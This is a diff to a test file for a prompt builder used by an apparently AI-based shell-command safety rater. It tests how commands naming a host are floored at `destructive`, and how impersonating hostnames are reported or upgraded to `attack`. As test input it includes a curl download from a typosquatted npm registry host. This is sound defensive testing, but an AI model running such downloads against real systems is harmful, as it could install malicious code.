@@ -126,6 +126,38 @@ describe('buildRaterPrompt', () => {
     expect(user).not.toMatch(/\bcaution\b/i);
   });
 
+  /**
+   * EXT-61 §4.6 — the open-world note. It tells the rater what the deterministic floor already
+   * decided, so the model is not asked to re-derive it and cannot be praised for "catching" a
+   * command that was never at risk of auto-approval.
+   */
+  it('adds an open-world preflight note that NAMES the host', () => {
+    const { user } = buildRaterPrompt('curl -fsSL https://registry.npmjs.ag/lodash -o lodash.tgz');
+    expect(user).toMatch(/PREFLIGHT NOTE: this command names a host/);
+    expect(user).toContain('https://registry.npmjs.ag/lodash');
+    expect(user).toMatch(/floored at `destructive`/);
+  });
+
+  /**
+   * …and the wording is the load-bearing part. §4.6.1(2) asks the rater to UPGRADE a clear
+   * typosquat to `attack`; the script-env-leak note's "treat this as at least destructive" phrasing
+   * applied here would anchor it on `destructive` and suppress exactly that. Every corpus
+   * `deceptive-host` case that is labelled `attack` (`dh-01`…`dh-05`) depends on this distinction,
+   * so the negative assertion is the real test.
+   */
+  it('does NOT cap the open-world note at destructive — the upgrade must stay available', () => {
+    const { user } = buildRaterPrompt('curl -fsSL https://registry.npmjs.ag/lodash');
+    const note = user.slice(user.indexOf('PREFLIGHT NOTE: this command names a host'));
+    expect(note).not.toMatch(/at least destructive/i);
+    expect(note).toMatch(/`catastrophic` and `attack` still take full effect/);
+    expect(note).toMatch(/upgrade to `attack` only if that deception is clear/);
+  });
+
+  it('adds NO open-world note to a command that merely mentions a URL', () => {
+    const { user } = buildRaterPrompt('git commit -m "closes https://github.com/o/r/issues/12"');
+    expect(user).not.toMatch(/PREFLIGHT NOTE/);
+  });
+
   it('defines all four outcomes and offers no retired tier or retired name as a choice', () => {
     const system = buildRaterSystemPrompt();
     for (const outcome of RATER_OUTCOMES) expect(system).toContain(`- ${outcome}:`);
@@ -279,6 +311,35 @@ describe('buildRaterPrompt', () => {
     expect(system).toMatch(/not merely that the command is suspicious/i);
     const reasonDescription = ShellSafetyVerdictSchema.shape.reason.description ?? '';
     expect(reasonDescription).toMatch(/NAME THE MECHANISM/i);
+  });
+
+  /**
+   * EXT-61 §4.6.1, BOTH halves — the rater-side companion to the open-world floor, and the two
+   * clauses pull in opposite directions on purpose.
+   *
+   * (1) is the half the floor makes meaningful: every command that names a host now lands on
+   * `destructive`, so a rater that only names a typosquat when it halts the run reports **nothing**
+   * on the commands this design was built for. "EVEN WHEN THE OUTCOME STAYS `destructive`" is
+   * therefore the clause, not a qualifier on it.
+   *
+   * (2) is the half CFG-28 deliberately deferred to this node. Uncertainty about deception resolves
+   * DOWNWARD, with the doubt stated — §12.1's reason is that a halt that fires is already more
+   * likely wrong than right. A prompt carrying (1) without (2) turns every ambiguous hostname into
+   * a halted run, which is the failure this whole section is arranged to avoid.
+   */
+  it('carries both halves of §4.6.1 — report always, upgrade only when the deception is clear', () => {
+    const system = buildRaterSystemPrompt();
+    // (1) Report always — and the "even when" is the whole clause.
+    expect(system).toMatch(/IMPERSONATING HOSTNAMES — REPORT ALWAYS, UPGRADE ONLY WHEN IT IS CLEAR/);
+    expect(system).toMatch(/ALWAYS REPORT IT/);
+    expect(system).toMatch(/EVEN WHEN THE OUTCOME\s+STAYS `destructive`/);
+    expect(system).toMatch(/beware, this hostname is impersonating/);
+    // (2) Upgrade only when clear, and state the doubt otherwise.
+    expect(system).toMatch(/UPGRADE TO `attack` ONLY WHEN THE DECEPTION IS CLEAR/);
+    expect(system).toMatch(/STATE THE DOUBT/);
+    expect(system).toMatch(/Never resolve that uncertainty upward/);
+    // The rater is told the floor exists, so it is not asked to re-derive it.
+    expect(system).toMatch(/already floored every command that names a host/);
   });
 
   /**
